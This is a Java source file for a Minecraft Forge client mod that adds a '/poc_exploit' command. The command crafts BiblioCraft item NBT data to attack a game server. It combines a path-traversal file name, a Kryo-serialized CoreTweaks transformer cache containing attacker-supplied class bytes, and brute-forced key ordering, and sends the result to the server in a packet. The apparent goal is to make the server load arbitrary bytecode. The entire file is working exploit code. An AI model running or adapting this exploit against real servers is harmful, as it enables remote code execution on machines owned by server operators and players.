package com.exopteron.forgemodnew;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Iterator;
import java.util.LinkedHashMap;
import java.util.Map;

import cpw.mods.fml.common.Loader;
import cpw.mods.fml.common.ModClassLoader;
import jds.bibliocraft.blocks.BlockLoader;
import jds.bibliocraft.items.ItemLoader;
import net.minecraft.client.Minecraft;
import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.Blocks;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.CompressedStreamTools;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTException;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.server.MinecraftServer;


import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Input;
import com.esotericsoftware.kryo.io.Output;
import com.esotericsoftware.kryo.unsafe.UnsafeInput;

import makamys.coretweaks.optimization.transformercache.lite.TransformerCache;
import makamys.coretweaks.optimization.transformercache.lite.TransformerCache.TransformerData.CachedTransformation;

public class POCExploitCommand extends CommandBase {

    @Override
    public String getCommandName() {
        return "poc_exploit";
    }

    @Override
    public String getCommandUsage(ICommandSender p_71518_1_) {
        return "/poc_exploit [transformer_class_name] [target_class_name] [target_class_presize] [target_class_prehash] [target_class_local_copy_path]";
    }

    /// Args: /poc_exploit [transformer_class_name] [target_class_name] [target_class_presize] [target_class_prehash] [target_class_local_copy_path]
    @Override
    public void processCommand(ICommandSender sender, String[] args) {
        Minecraft mc = Minecraft.getMinecraft();
        if (mc.thePlayer.getHeldItem() == null || mc.thePlayer.getHeldItem().getItem() != ItemLoader.bookAtlas) {
            sender.addChatMessage(new net.minecraft.util.ChatComponentText("Must be holding an atlas!"));
            return;
        }
        if (args.length < 5) {
            sender.addChatMessage(new net.minecraft.util.ChatComponentText("Usage: " + this.getCommandUsage(sender)));
            return;
        }

        String transformer_class_name = args[0];
        String target_class_name = args[1];
        int target_class_presize = Integer.parseInt(args[2]);
        int target_class_prehash = Integer.parseInt(args[3]);
        String target_class_local_copy_path = args[4];

        ItemStack s = new ItemStack(ItemLoader.bookRecipe);
        NBTTagCompound tag2 = null;

        try {

            main: for (int asciiOne = 0x20; asciiOne <= 0x7e; asciiOne++) {
                for (int asciiTwo = 0x20; asciiTwo <= 0x7e; asciiTwo++) {
                    char asciiOneChar = (char) asciiOne;
                    char asciiTwoChar = (char) asciiTwo;

                    NBTTagCompound c = new NBTTagCompound();

                    Field f2 = NBTTagCompound.class.getDeclaredField("field_74784_a");
                    f2.setAccessible(true);
                    ByteArrayOutputStream f = new ByteArrayOutputStream();
                    f.write(new byte[] {
                            (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00
                    });


                    byte[] transformed = Files.readAllBytes(Paths.get(target_class_local_copy_path));

                    int origlen = target_class_presize;
                    int prehash = target_class_prehash;
                    Kryo kryo2 = new Kryo();
                    kryo2.setRegistrationRequired(false);
                    Output kOut = new Output(f);

                    kryo2.writeClassAndObject(kOut, transformer_class_name);
                    TransformerCache.TransformerData tr = new TransformerCache.TransformerData(
                            transformer_class_name);
                    CachedTransformation csh = new CachedTransformation(target_class_name, prehash,
                            origlen);
                    csh.putClass(transformed);
                    Field field = TransformerCache.TransformerData.class.getDeclaredField("transformationMap");
                    field.setAccessible(true);
                    Map<String, CachedTransformation> transformationMap = (Map) field.get(tr);
                    transformationMap.put(target_class_name, csh);
                    kryo2.writeClassAndObject(kOut, tr);
                    kOut.flush();
                    for (int i = 0; i < 10; i++) {
                        f.write(new byte[] {

                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                            0x03, (byte) (0x80 & 0xff),
                            0x00,
                    });
                    }

                    String asciiOneString = new String(new char[] { asciiOneChar });
                    String asciiTwoString = new String(new char[] { asciiTwoChar });
                    c.setInteger(asciiTwoString, 0);
                    c.setByteArray(asciiOneString, f.toByteArray());
                    c.setBoolean("signed", true);

                    NBTTagCompound display = new NBTTagCompound();
                    display.setString("Name", "../../coretweaks/cache/transformerCache");
                    c.setTag("display", display);
                    Map m = (Map) f2.get(c);

                    Iterator i = m.keySet().iterator();
                    if (i.next().equals(asciiTwoString) && i.next().equals(asciiOneString)) {
                        tag2 = c;
                        break main;
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        if (tag2 == null) {
            throw new RuntimeException("Could not find right hash!");
        }
        s.setTagCompound(tag2);




        ItemStack atlasOne = new ItemStack(ItemLoader.bookAtlas);



        ItemStack workbench = new ItemStack(BlockLoader.typemachine);


        NBTTagCompound atlasOneTag = new NBTTagCompound();
        NBTTagList atlasOneInv = new NBTTagList();
        NBTTagCompound ourItemTag = new NBTTagCompound();
        s.writeToNBT(ourItemTag);
        atlasOneInv.appendTag(ourItemTag);
        atlasOneInv.appendTag(itemToNBT(workbench, 1));



        ItemStack chest = new ItemStack(ItemLoader.bookAtlas);
        NBTTagCompound chestTag = new NBTTagCompound();
        chestTag.setTag("Inventory", atlasOneInv);
        chest.setTagCompound(chestTag);

        NBTTagList newInv = new NBTTagList();
        newInv.appendTag(itemToNBT(chest, 0));

        atlasOneTag.setTag("Inventory", newInv);


        atlasOne.setTagCompound(atlasOneTag);


        ItemStack atlasTwo = new ItemStack(ItemLoader.bookAtlas);

        NBTTagCompound atlasTwoTag = new NBTTagCompound();
        NBTTagList atlasTwoInv = new NBTTagList();
        NBTTagCompound atlasOneItemTag = new NBTTagCompound();
        atlasOne.writeToNBT(atlasOneItemTag);
        atlasTwoInv.appendTag(atlasOneItemTag);
        atlasTwoTag.setTag("Inventory", atlasTwoInv);
        
        atlasTwo.setTagCompound(atlasTwoTag);

        Utils.sendPacket("BiblioUpdateInv", atlasTwo);
    }

    public static NBTTagCompound itemToNBT(ItemStack i, Integer slot) {
        NBTTagCompound t = new NBTTagCompound();
        i.writeToNBT(t);
        if (slot != null) {
            t.setInteger("Slot", slot);
        }
        return t;
    }

    @Override
    public int getRequiredPermissionLevel() {
        return 0;
    }
}
